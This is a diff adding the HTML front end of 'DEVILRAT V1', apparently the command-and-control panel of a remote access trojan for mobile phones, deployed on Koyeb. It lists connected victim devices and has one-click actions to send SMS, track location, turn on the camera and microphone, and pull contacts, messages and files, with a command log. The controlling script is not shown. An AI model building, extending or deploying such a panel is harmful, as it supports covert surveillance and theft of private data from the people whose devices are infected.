@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>👹 DEVILRAT V1 - Koyeb</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="devil-nav">
+        <div class="nav-brand">
+            <i class="fas fa-skull-crossbones"></i>
+            <span>DEVILRAT V1</span>
+        </div>
+        <div class="nav-stats">
+            <span class="stat-badge" id="onlineCount">0</span>
+            <span class="stat-label">ONLINE</span>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Header -->
+        <header class="dashboard-header">
+            <h1><i class="fas fa-fire"></i> DEVICE CONTROL PANEL</h1>
+            <p class="subtitle">Koyeb Deployment • Real-time Monitoring • Full Control</p>
+            <div class="connection-status" id="connectionStatus">
+                <i class="fas fa-wifi"></i>
+                <span>Connecting...</span>
+            </div>
+        </header>
+
+        <!-- Stats Cards -->
+        <div class="stats-grid">
+            <div class="stat-card danger">
+                <div class="stat-icon"><i class="fas fa-mobile-alt"></i></div>
+                <div class="stat-value" id="totalDevices">0</div>
+                <div class="stat-label">DEVICES</div>
+            </div>
+            <div class="stat-card success">
+                <div class="stat-icon"><i class="fas fa-bolt"></i></div>
+                <div class="stat-value" id="activeCommands">0</div>
+                <div class="stat-label">COMMANDS</div>
+            </div>
+            <div class="stat-card warning">
+                <div class="stat-icon"><i class="fas fa-database"></i></div>
+                <div class="stat-value" id="totalLogs">0</div>
+                <div class="stat-label">LOGS</div>
+            </div>
+        </div>
+
+        <!-- Device List -->
+        <section class="section">
+            <div class="section-header">
+                <h2><i class="fas fa-satellite-dish"></i> CONNECTED DEVICES</h2>
+                <button class="btn-refresh" onclick="loadDevices()">
+                    <i class="fas fa-sync-alt"></i> REFRESH
+                </button>
+            </div>
+            <div class="device-list" id="deviceList">
+                <div class="empty-state">
+                    <i class="fas fa-ghost"></i>
+                    <p>No devices connected</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Quick Actions -->
+        <section class="section">
+            <div class="section-header">
+                <h2><i class="fas fa-bolt"></i> QUICK ACTIONS</h2>
+            </div>
+            <div class="action-grid">
+                <button class="action-btn sms" onclick="showCommandModal('sms')">
+                    <i class="fas fa-sms"></i>
+                    <span>SEND SMS</span>
+                </button>
+                <button class="action-btn location" onclick="showCommandModal('location')">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>GET LOCATION</span>
+                </button>
+                <button class="action-btn camera" onclick="showCommandModal('camera')">
+                    <i class="fas fa-camera"></i>
+                    <span>CAMERA</span>
+                </button>
+                <button class="action-btn mic" onclick="showCommandModal('mic')">
+                    <i class="fas fa-microphone"></i>
+                    <span>MICROPHONE</span>
+                </button>
+                <button class="action-btn contacts" onclick="executeCommand('contacts')">
+                    <i class="fas fa-address-book"></i>
+                    <span>CONTACTS</span>
+                </button>
+                <button class="action-btn messages" onclick="executeCommand('messages')">
+                    <i class="fas fa-comment-alt"></i>
+                    <span>MESSAGES</span>
+                </button>
+                <button class="action-btn files" onclick="executeCommand('files')">
+                    <i class="fas fa-folder"></i>
+                    <span>FILES</span>
+                </button>
+                <button class="action-btn vibrate" onclick="executeCommand('vibrate')">
+                    <i class="fas fa-vibrate"></i>
+                    <span>VIBRATE</span>
+                </button>
+            </div>
+        </section>
+
+        <!-- Command Logs -->
+        <section class="section">
+            <div class="section-header">
+                <h2><i class="fas fa-terminal"></i> COMMAND LOGS</h2>
+                <button class="btn-clear" onclick="clearLogs()">
+                    <i class="fas fa-trash"></i> CLEAR
+                </button>
+            </div>
+            <div class="logs-container">
+                <div class="log-list" id="logList">
+                    <div class="log-item system">
+                        <div class="log-time">[SYSTEM]</div>
+                        <div class="log-message">DEVILRAT V1 Panel initialized</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <button class="nav-btn active" onclick="showSection('devices')">
+            <i class="fas fa-mobile-alt"></i>
+            <span>Devices</span>
+        </button>
+        <button class="nav-btn" onclick="showSection('commands')">
+            <i class="fas fa-terminal"></i>
+            <span>Commands</span>
+        </button>
+        <button class="nav-btn" onclick="showSection('logs')">
+            <i class="fas fa-history"></i>
+            <span>Logs</span>
+        </button>
+        <button class="nav-btn" onclick="showSettings()">
+            <i class="fas fa-cog"></i>
+            <span>Settings</span>
+        </button>
+    </div>
+
+    <!-- Modals -->
+    <div class="modal" id="commandModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">COMMAND</h3>
+                <button class="modal-close" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="modalBody">
+                <!-- Dynamic content -->
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="deviceModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>SELECT DEVICE</h3>
+                <button class="modal-close" onclick="closeDeviceModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="device-select-list" id="deviceSelectList"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="script.js"></script>
+</body>
+          </html>
